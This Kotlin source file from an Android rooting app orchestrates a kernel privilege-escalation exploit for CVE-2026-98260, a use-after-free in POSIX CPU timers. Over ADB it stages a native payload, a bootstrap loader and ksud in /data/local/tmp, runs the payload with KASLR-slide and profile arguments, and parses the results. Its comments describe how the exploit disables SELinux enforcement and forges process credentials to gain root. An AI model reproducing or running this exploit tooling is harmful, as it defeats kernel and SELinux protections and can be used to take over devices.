package com.hexo141.liquidglass.root

import android.content.Context
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import com.hexo141.liquidglass.bootimg.Cve98260Profile
import com.hexo141.liquidglass.bootimg.ProfileStore
import com.hexo141.liquidglass.device.DeviceInfo
import java.io.File

/**
 * Fifth engine: CVE-2026-98260, the POSIX CPU timer `exec()` use-after-free.
 *
 * `execve()` frees the calling thread group's `k_itimer` objects while the timer expiry path may
 * still hold a reference to one of them. The payload spends that dangling node to get a one-shot
 * kernel pointer write, clears `selinux_state.enforcing`, then points `current->cred` at a forged
 * credential page in a reclaimed socket buffer and pins that page with a resident child.
 *
 * Two things make this engine different from the other four:
 *
 * - **It carries its own orchestration.** The other payloads take a profile and run a fixed
 *   sequence; this one calibrates the KASLR slide and `page_offset` itself, then decides how many
 *   rounds it needs. The runner only stages files, starts it and reads the result.
 * - **Its profile is not GLK1.** It needs link-time symbol addresses (`do_timer_create+0xA8`,
 *   `prepare_creds+0x24`, `selinux_state`, `init_user_ns`, `root_user`, `init_groups`,
 *   `init_ucounts`) plus the forged-cred layout, which is what [Cve98260Profile] holds. The same
 *   `boot.img` parse produces both profiles.
 *
 * After the uid is cleared the payload `exec`s the staged `bootstrap` (`OPENROOT_HANDOFF`), so the
 * KernelSU late-load / root command channel decision is made in one place for every engine.
 */
object Cve98260Runner {
    private const val STAGE_DIR = "/data/local/tmp/openroot"
    private const val PAYLOAD = "libcve98260.so"
    private const val PROFILE = "c98260.conf"
    private const val BOOTSTRAP = "libopenbootstrap.so"
    private const val BOOTSTRAP_REMOTE = "loader"

    /** `--kaslr-only` prints exactly one of these; nothing else in the stream matches. */
    private const val SLIDE_MARKER = "C98260_SLIDE=0x"

    /** Printed by `--selinux-only` when the payload stops before touching cred. */
    private const val SELINUX_ONLY_DONE = "C98260_SELINUX_ONLY_DONE=1"

    /** Present when `--skip-selinux-check` was used: the write ran, enforce was not read back. */
    private const val SELINUX_ONLY_UNVERIFIED = "C98260_SELINUX_UNVERIFIED=1"

    /** Bundled tables the payload carries for these two releases; anything else needs a parse. */
    private val BUNDLED_RELEASES = listOf("6.1.134", "6.6.118")

    data class Result(
        val exitCode: Int,
        val handoff: RootHandoff.Result,
    )

    fun isPayloadPresent(context: Context): Boolean =
        File(context.applicationInfo.nativeLibraryDir, PAYLOAD).isFile

    /** A parsed profile for this exact release, or the two releases the payload has built in. */
    fun hasProfile(context: Context, release: String): Boolean {
        if (release.isEmpty()) return false
        // A file that no longer parses is not a profile: fall back to the built-in table instead
        // of handing the payload half a snapshot.
        val parsed = ProfileStore.loadC98260(context, release)
            ?.let { Cve98260Profile.parse(it) } != null
        return parsed || BUNDLED_RELEASES.any { release.startsWith(it) }
    }

    /** The bug landed in 5.7; older trees cannot reach the `exec()` timer-free path at all. */
    fun kernelSupports(release: String): Boolean {
        val head = release.takeWhile { it.isDigit() || it == '.' }
        val parts = head.split('.').mapNotNull { it.toIntOrNull() }
        val major = parts.getOrNull(0) ?: return false
        val minor = parts.getOrNull(1) ?: 0
        return major > 5 || (major == 5 && minor >= 7)
    }

    fun isSupported(context: Context, info: DeviceInfo): Boolean =
        kernelSupports(info.kernel) && hasProfile(context, info.kernel)

    /** Engine name for the status card, or {@code null} when this kernel cannot be covered. */
    fun describe(context: Context, info: DeviceInfo): String? =
        if (isSupported(context, info)) "CVE-2026-98260" else null

    /**
     * Stages the payload, its profile and the root handoff, then runs it as the `shell` user.
     *
     * @param profile parsed 98260 snapshot for this release; {@code null} lets the payload fall
     *        back to its built-in table, which only exists for [BUNDLED_RELEASES]
     * @param slide KASLR slide resolved elsewhere (manually or by [resolveSlide]); {@code null}
     *        lets the payload calibrate it itself
     * @param selinuxOnly stop right after `selinux_enforcing` is cleared: no cred rewrite, no
     *        bootstrap, no handoff probe. The payload prints `C98260_SELINUX_ONLY_DONE=1`
     *        (plus `C98260_SELINUX_UNVERIFIED=1` when the enforce readback was skipped)
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        release: String,
        profile: Cve98260Profile?,
        suManager: KsuManager.Target?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
        slide: Long? = null,
        selinuxOnly: Boolean = false,
    ): Result {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, PAYLOAD)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        onProgress(0.04f)
        onLine("$ mkdir -p $STAGE_DIR")
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")

        onLine("$ cat > $STAGE_DIR/$PAYLOAD")
        AdbShell.push(manager, "$STAGE_DIR/$PAYLOAD", payloadFile.readBytes())
        onProgress(0.12f)
        onLine("$ chmod 755 $STAGE_DIR/$PAYLOAD")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$PAYLOAD")

        // The handoff target: bootstrap reads openroot.xml and decides late-load vs command channel.
        onLine("$ cat > $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.push(manager, "$STAGE_DIR/$BOOTSTRAP_REMOTE", bootstrap.readBytes())
        onProgress(0.2f)
        onLine("$ chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")

        val managerValue = suManager?.packageName.orEmpty().ifEmpty { "none" }
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        onLine("$ cat > $STAGE_DIR/openroot.xml")
        AdbShell.push(manager, "$STAGE_DIR/openroot.xml", prefs)
        onProgress(0.26f)
        AdbShell.exec(manager, "chmod 644 $STAGE_DIR/openroot.xml")

        if (suManager != null) {
            onLine("$ cp ${suManager.ksudPath} $STAGE_DIR/ksud")
            val copy = AdbShell.exec(
                manager,
                "cp '${suManager.ksudPath}' $STAGE_DIR/ksud && chmod 755 $STAGE_DIR/ksud && echo ok",
            )
            onProgress(0.32f)
            if (!copy.contains("ok")) {
                onLine(copy.trim())
                throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
            }
        }

        val profileArg = if (profile != null) {
            onLine("$ cat > $STAGE_DIR/$PROFILE")
            AdbShell.push(
                manager,
                "$STAGE_DIR/$PROFILE",
                profile.toHocon("parsed on device").toByteArray(),
            )
            AdbShell.exec(manager, "chmod 644 $STAGE_DIR/$PROFILE")
            onProgress(0.36f)
            onLine(
                "$ [profile] ${profile.release} - timer_link=0x" +
                    java.lang.Long.toHexString(profile.timerLink) +
                    " cred_link=0x" + java.lang.Long.toHexString(profile.credLink)
            )
            " --profile $PROFILE"
        } else {
            onLine("<i> no parsed profile for $release; the payload's built-in table is used")
            ""
        }
        val slideArg = slide?.let { " --slide 0x" + java.lang.Long.toHexString(it) }.orEmpty()
        val modeArg = if (selinuxOnly) " --selinux-only" else ""

        onLine("$ cd $STAGE_DIR && OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE " +
            "./$PAYLOAD --color=never --no-ksu$profileArg$slideArg$modeArg")
        var selinuxDone = false
        var selinuxUnverified = false
        val exitCode = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE C98260_VERBOSE=1 " +
                "./$PAYLOAD --color=never --no-ksu$profileArg$slideArg$modeArg 2>&1",
            { line ->
                val cleaned = cleanStatus(line)
                if (cleaned.contains(SELINUX_ONLY_DONE)) selinuxDone = true
                if (cleaned.contains(SELINUX_ONLY_UNVERIFIED)) selinuxUnverified = true
                if (cleaned.isNotEmpty()) {
                    stageProgress(cleaned)?.let(onProgress)
                    onLine(cleaned)
                }
            },
            // One priming round can be silent for a minute, and the payload runs up to twelve of
            // them for SELinux plus twelve more for the credential.
            idleTimeoutMs = 600_000,
        )
        onProgress(0.92f)

        if (selinuxOnly) {
            onProgress(1f)
            val detail = when {
                selinuxUnverified -> "SELinux write executed, enforce not read back"
                selinuxDone -> "SELinux is permissive"
                else -> "SELinux was not confirmed permissive"
            }
            return Result(exitCode, RootHandoff.Result(RootHandoff.State.NONE, emptySet(), detail))
        }

        val handoff = RootHandoff.probe(manager, onLine, waitMs = 20_000)
        onProgress(1f)
        return Result(exitCode, handoff)
    }

    /**
     * Calibration A only: the payload creates a burst of POSIX CPU timers, reads the
     * `kmem_cache_alloc` call site out of the raw ftrace buffer and prints the slide, then exits
     * without touching kernel state. This is the automatic half of the KASLR card; the manual half
     * skips the device work entirely and just feeds the value back through `--slide`.
     *
     * Needs the same `shell` channel as the real run, because it must write to tracefs.
     *
     * @return the slide the payload reported, or {@code null} when it never printed one
     */
    @Throws(Exception::class)
    fun resolveSlide(
        context: Context,
        manager: AbsAdbConnectionManager,
        release: String,
        profile: Cve98260Profile?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Long? {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, PAYLOAD)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }

        onProgress(0.05f)
        onLine("$ mkdir -p $STAGE_DIR")
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")
        onLine("$ cat > $STAGE_DIR/$PAYLOAD")
        AdbShell.push(manager, "$STAGE_DIR/$PAYLOAD", payloadFile.readBytes())
        onLine("$ chmod 755 $STAGE_DIR/$PAYLOAD")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$PAYLOAD")
        onProgress(0.28f)

        val profileArg = if (profile != null) {
            onLine("$ cat > $STAGE_DIR/$PROFILE")
            AdbShell.push(
                manager,
                "$STAGE_DIR/$PROFILE",
                profile.toHocon("parsed on device").toByteArray(),
            )
            AdbShell.exec(manager, "chmod 644 $STAGE_DIR/$PROFILE")
            onLine(
                "$ [profile] ${profile.release} - timer_link=0x" +
                    java.lang.Long.toHexString(profile.timerLink)
            )
            onProgress(0.42f)
            " --profile $PROFILE"
        } else {
            onLine("<i> no parsed profile for $release; the built-in table is used")
            ""
        }

        var slide: Long? = null
        onLine("$ cd $STAGE_DIR && ./$PAYLOAD --color=never --no-ksu --kaslr-only$profileArg")
        val exitCode = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "./$PAYLOAD --color=never --no-ksu --kaslr-only$profileArg 2>&1",
            { line ->
                val cleaned = cleanStatus(line)
                if (cleaned.isNotEmpty()) {
                    onLine(cleaned)
                    val at = cleaned.indexOf(SLIDE_MARKER)
                    if (at >= 0) {
                        val raw = cleaned.substring(at + SLIDE_MARKER.length).trim()
                        val end = raw.indexOfFirst { !it.isLetterOrDigit() }
                        val value = if (end < 0) raw else raw.substring(0, end)
                        slide = value.toLongOrNull(16)
                    }
                }
            },
            // One priming round can be silent for a minute; calibration A is a single round.
            idleTimeoutMs = 180_000,
        )
        onProgress(1f)
        if (slide == null) {
            onLine("<i> --kaslr-only exited with $exitCode without printing a slide")
        }
        return slide
    }

    /** `\x1eC98260_STATUS <stage> <status>` is the host protocol marker, not a log line. */
    private fun cleanStatus(line: String): String {
        val marker = "\u001eC98260_STATUS"
        if (!line.contains(marker)) return line.trimEnd()
        val rest = line.substringAfter(marker).trim()
        return if (rest.isEmpty()) "" else "[stage] " + rest.replace(' ', ':')
    }

    /** Maps the payload's own progress markers onto the bar; {@code null} leaves it untouched. */
    private fun stageProgress(line: String): Float? = when {
        line.contains("[stage] inject:running") -> 0.5f
        line.contains("[stage] verify:ok") -> 0.86f
        line.contains("[stage] ksu:running") -> 0.9f
        line.contains("[stage] ksu:ok") -> 0.95f
        line.contains("[stage] ksu:failed") -> 0.95f
        line.contains("[stage] inject:failed") -> 0.95f
        else -> null
    }
}
